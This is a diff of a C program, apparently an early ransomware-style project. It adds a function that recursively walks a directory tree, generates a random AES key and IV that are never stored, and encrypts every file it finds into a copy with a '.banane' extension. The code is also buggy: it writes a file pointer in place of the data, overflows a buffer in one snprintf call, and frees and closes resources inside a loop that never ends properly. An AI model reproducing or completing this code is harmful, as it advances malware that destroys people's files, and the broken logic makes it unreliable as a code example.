@@ -8,38 +8,7 @@
 #include <openssl/rand.h>
 
 
-void list_dir(const char *path) {
-    DIR *directory;
-    struct dirent *entry;
-    directory = opendir(path);
-    printf("Reading files in: %s\n", path);
 
-    while ((entry = readdir(directory)) != NULL) {
-        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-            unsigned short int lenght = strlen(path) + 1 + strlen(entry->d_name) + 1;
-            char *buffer = (char *) malloc(lenght * sizeof(char));
-            if (buffer != NULL) {
-                snprintf(buffer, lenght, "%s/%s", path, entry->d_name);
-                list_dir(buffer);
-                free(buffer);
-            }
-        } else if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-            printf("%s/%s\n", path, entry->d_name);
-            unsigned short int lenght = strlen(path) + 1 + strlen(entry->d_name) + 1;
-            char *buffer = (char *) malloc(lenght * sizeof(char));
-            if (buffer != NULL) {
-                snprintf(buffer, lenght, "%s/%s", path, entry->d_name);
-                if (buffer == NULL){
-                    printf("Can't open the file\n");
-                }
-                free(buffer);
-            }
-
-        }
-
-        closedir(directory);
-    }
-}
 
     void handleErrors(void) {
         ERR_print_errors_fp(stderr);
@@ -137,6 +106,76 @@ void list_dir(const char *path) {
 
 #define KEY_SIZE 32
 #define IV_SIZE 16
+
+void list_dir(const char *path) {
+
+    DIR *directory;
+    FILE *fp, *fp_out;
+    struct dirent *entry;
+    directory = opendir(path);
+    printf("Reading files in: %s\n", path);
+
+    unsigned char key[KEY_SIZE];
+    unsigned char iv[IV_SIZE];
+
+    RAND_bytes(key, KEY_SIZE);
+    RAND_bytes(iv, IV_SIZE);
+
+    while ((entry = readdir(directory)) != NULL) {
+
+        char *file = entry->d_name;
+
+        if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 && strcmp(file, "..") != 0) {
+            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
+            char *buffer = (char *) malloc(lenght * sizeof(char));
+            if (buffer != NULL) {
+                snprintf(buffer, lenght, "%s/%s", path, file);
+                list_dir(buffer);
+                free(buffer);
+            }
+        } else if (strcmp(file, ".") != 0 && strcmp(file, "..") != 0) {
+            printf("%s/%s\n", path, file);
+            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
+            char *buffer = (char *) malloc(lenght * sizeof(char));
+            char *buffer_out = (char *) malloc(lenght * sizeof(char));
+            if (buffer != NULL) {
+                snprintf(buffer, lenght, "%s/%s", path, file);
+
+                if (buffer == NULL) {
+                    printf("No file\n");
+                }
+
+                printf("Opening %s \n", buffer);
+                fp = fopen(buffer, "r+");
+                snprintf(buffer_out, lenght+10, "%s/%s.banane", path, file);
+                fp_out = fopen(buffer_out, "a+");
+
+                if (fp == NULL) {
+                    printf("Can't open file\n");
+                } else {
+                    int read_file_len = fread(buffer, strlen(buffer) + 1, 1, fp);
+                    printf("%s\n", buffer);
+                    while (read_file_len != 0) {
+                        int file_crypted_len = encrypt(fp, read_file_len, key, iv, fp_out);
+                        fwrite(fp, file_crypted_len+1, 1, fp_out);
+                        BIO_dump_fp(stdout, (const char *) fp, file_crypted_len);
+                        fclose(fp);
+                        fclose(fp_out);
+                        free(buffer);
+                        free(buffer_out);
+                    }
+
+                }
+
+
+            }
+
+        }
+
+
+    }closedir(directory);
+
+}
 
     int main(int argc, char *argv[]) {
 
